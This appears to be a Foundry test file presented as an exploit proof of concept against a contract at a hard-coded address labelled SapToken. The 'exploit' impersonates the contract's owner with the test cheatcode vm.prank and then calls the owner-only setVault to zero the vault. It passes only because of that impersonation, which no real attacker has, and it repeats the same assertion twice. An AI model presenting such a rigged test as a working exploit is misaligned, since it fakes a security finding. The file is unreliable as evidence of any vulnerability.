// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface SapToken {
    function owner() external view returns (address);
    function setVault(address vault_) external returns (bool);
    function vault() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x039639Ed22A7654f74C1B0017C9d0DF85C26B63B;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the existing TARGET contract
        // Just label the contract for clarity
        vm.label(TARGET, "SapToken");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = SapToken(TARGET).owner();

        // Impersonate the owner and set vault to zero address
        vm.prank(owner);
        SapToken(TARGET).setVault(address(0));

        // Verify the vault is now zero address
        address currentVault = SapToken(TARGET).vault();
        assertEq(currentVault, address(0), "Vault should be zero address");
        assertEq(currentVault, address(0), "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
